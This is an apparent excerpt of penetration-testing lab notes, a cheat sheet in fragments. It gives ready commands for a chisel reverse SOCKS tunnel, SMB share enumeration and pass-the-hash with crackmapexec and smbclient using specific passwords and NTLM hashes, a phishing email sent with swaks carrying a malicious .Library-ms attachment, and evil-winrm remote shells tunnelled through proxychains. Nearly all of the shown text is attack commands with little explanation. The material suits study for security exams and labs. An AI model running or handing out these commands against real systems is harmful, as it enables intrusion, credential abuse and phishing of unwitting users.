...
chisel64.exe client 192.168.45.217:8000 R:socks
   ...
   edit the proxychains conf in order to put at the end "socks5
   127.0.0.1:1080".
...
** HTTP
   ADD: tool for enumeration of word-press sites
...
smbmap -H <IP>
   ...
   #+begin_example
crackmapexec smb 192.168.242.147 -u web_svc -p Diamond1 --shares
   #+end_example

   list share of particular user with NTLM hash
   #+begin_example
crackmapexec smb 192.168.242.147 -u web_svc -H 820d6348890893116880101307197052
   #+end_example
...
crackmapexec smb 192.168.242.147 -u usernames.txt -p Diamond1 --shares
   ...
   #+begin_example
smbclient //172.16.246.11/C$ -U medtech.com/joe%Flowers1
smbclient //192.168.212.248/transfer -U damon --pw-nt-hash 820d6348890893116880101307197052 -W relia.com
   #+end_example
...
Hi,
 ...
 please click on the attachment :D
    ...
    #+begin_example
swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.186.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
    #+end_example
...
Enter-PSSession 1
    ...
    #+begin_example
proxychains evil-winrm -i 192.168.243.153 -u administrator -p December31
proxychains evil-winrm -i 10.10.132.146 -u tom_admin -H 4979d69d4ca66955c075c41cf45f24dc
    #+end_example
